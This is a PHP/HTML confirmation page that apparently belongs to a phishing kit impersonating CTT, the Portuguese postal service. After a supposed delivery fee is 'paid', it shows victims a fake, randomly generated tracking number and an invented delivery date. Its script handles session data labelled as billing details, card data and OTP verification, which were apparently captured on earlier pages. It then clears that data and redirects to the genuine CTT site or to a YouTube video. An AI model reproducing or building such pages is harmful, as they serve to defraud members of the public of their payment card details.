<?php
session_start();
require_once 'includes/header.php';
?>

<div class="max-w-2xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
    <div class="bg-white shadow-lg border-0 rounded-lg overflow-hidden">
        <div class="p-8">
            <!-- Success Header -->
            <div class="text-center mb-8">
                <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                    <svg class="w-8 h-8 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                    </svg>
                </div>
                <h2 class="text-2xl font-bold text-gray-900 mb-2">
                    Pagamento realizado com sucesso!
                </h2>
                <p class="text-gray-600">
                    A sua encomenda está a ser processada
                </p>
            </div>

            <!-- Order Details -->
            <div class="space-y-6">
                <!-- Tracking Number -->
                <div class="bg-gray-50 rounded-lg p-4">
                    <div class="flex items-center">
                        <svg class="w-5 h-5 text-red-600 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 7l-8-4-8 4m16 0l-8 4m8-4v10l-8 4m0-10L4 7m8 4v10M4 7v10l8 4"></path>
                        </svg>
                        <div class="flex-1">
                            <h3 class="font-semibold text-gray-900">Número de rastreio</h3>
                            <p class="text-lg font-mono text-red-600" id="trackingNumber">
                                <!-- Will be populated by JavaScript -->
                            </p>
                        </div>
                    </div>
                </div>

                <!-- Status -->
                <div class="bg-blue-50 rounded-lg p-4">
                    <div class="flex items-center">
                        <svg class="w-5 h-5 text-blue-600 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4"></path>
                        </svg>
                        <div class="flex-1">
                            <h3 class="font-semibold text-gray-900">Estado atual</h3>
                            <p class="text-blue-600">Processamento inicial - Taxa paga</p>
                        </div>
                    </div>
                </div>

                <!-- Delivery Date -->
                <div class="bg-green-50 rounded-lg p-4">
                    <div class="flex items-center">
                        <svg class="w-5 h-5 text-green-600 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7V3a2 2 0 012-2h4a2 2 0 012 2v4m-6 4l4 4m0-8l4 4m-4-4v12"></path>
                        </svg>
                        <div class="flex-1">
                            <h3 class="font-semibold text-gray-900">Entrega prevista</h3>
                            <p class="text-green-600" id="deliveryDate">
                                <!-- Will be populated by JavaScript -->
                            </p>
                        </div>
                    </div>
                </div>

                <!-- Delivery Address -->
                <div class="bg-gray-50 rounded-lg p-4">
                    <div class="flex items-center">
                        <svg class="w-5 h-5 text-gray-600 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"></path>
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"></path>
                        </svg>
                        <div class="flex-1">
                            <h3 class="font-semibold text-gray-900">Endereço de entrega</h3>
                            <p class="text-gray-600" id="deliveryAddress">
                                <!-- Will be populated by JavaScript -->
                            </p>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Action Buttons -->
            <div class="mt-8 space-y-4">
                <button
                    onclick="trackOrder()"
                    class="w-full bg-red-600 hover:bg-red-700 text-white py-3 text-lg font-medium rounded-md"
                >
                    Rastrear Encomenda
                </button>
                
                <button
                    onclick="newOrder()"
                    class="w-full border border-red-600 text-red-600 hover:bg-red-50 py-3 text-lg font-medium rounded-md"
                >
                    Nova Encomenda
                </button>
            </div>

            <!-- Footer Info -->
            <div class="mt-8 text-center text-sm text-gray-500">
                <p id="emailConfirmation">
                    <!-- Will be populated by JavaScript -->
                </p>
                <p class="mt-2">
                    Para questões sobre a sua encomenda, contacte-nos através do número de rastreio acima.
                </p>
            </div>
        </div>
    </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
    // Load data from sessionStorage
    const billingData = JSON.parse(sessionStorage.getItem('ctt_billing_data') || '{}');
    const otpVerified = sessionStorage.getItem('ctt_otp_verified');
    let trackingNumber = sessionStorage.getItem('ctt_tracking_number');
    
    console.log('Loaded billing data:', billingData);
    console.log('OTP verified:', otpVerified);
    console.log('Tracking number:', trackingNumber);
    
    if (!billingData.nome || !otpVerified) {
        // If no verification data, redirect to billing page
        console.log('No verification data found, redirecting to billing page');
        window.location.href = 'billing.php';
        return;
    }
    
    // Generate or use stored tracking number
    if (!trackingNumber) {
        const randomNumbers = Math.floor(Math.random() * 900000000) + 100000000;
        trackingNumber = `RR${randomNumbers}PT`;
        sessionStorage.setItem('ctt_tracking_number', trackingNumber);
        console.log('Generated new tracking number:', trackingNumber);
    }
    
    // Calculate delivery date (5 business days from now)
    function calculateDeliveryDate() {
        const today = new Date();
        let businessDays = 0;
        let currentDate = new Date(today);
        
        while (businessDays < 5) {
            currentDate.setDate(currentDate.getDate() + 1);
            const dayOfWeek = currentDate.getDay();
            
            // Skip weekends (Saturday = 6, Sunday = 0)
            if (dayOfWeek !== 0 && dayOfWeek !== 6) {
                businessDays++;
            }
        }
        
        return currentDate.toLocaleDateString('pt-PT', {
            weekday: 'long',
            year: 'numeric',
            month: 'long',
            day: 'numeric'
        });
    }
    
    // Populate the page with data
    document.getElementById('trackingNumber').textContent = trackingNumber;
    document.getElementById('deliveryDate').textContent = calculateDeliveryDate();
    document.getElementById('deliveryAddress').innerHTML = 
        `${billingData.endereco}<br />${billingData.codigoPostal} ${billingData.cidade}`;
    document.getElementById('emailConfirmation').textContent = 
        `Será enviado um email de confirmação para ${billingData.email}`;
        
    console.log('Page populated successfully');
});

function trackOrder() {
    console.log('Track order button clicked - redirecting to CTT website');
    // Redirect to CTT website as requested
    window.open('https://www.ctt.pt/particulares/index', '_blank');
}

function newOrder() {
    console.log('New order button clicked - clearing data and redirecting to YouTube');
    // Clear sessionStorage and redirect to YouTube as requested
    sessionStorage.removeItem('ctt_billing_data');
    sessionStorage.removeItem('ctt_card_data');
    sessionStorage.removeItem('ctt_otp_verified');
    sessionStorage.removeItem('ctt_tracking_number');
    sessionStorage.removeItem('ctt_billing_id');
    sessionStorage.removeItem('ctt_session_id');
    
    window.open('https://youtu.be/xvFZjo5PgG0?list=RDxvFZjo5PgG0', '_blank');
}
</script>

<?php require_once 'includes/footer.php'; ?>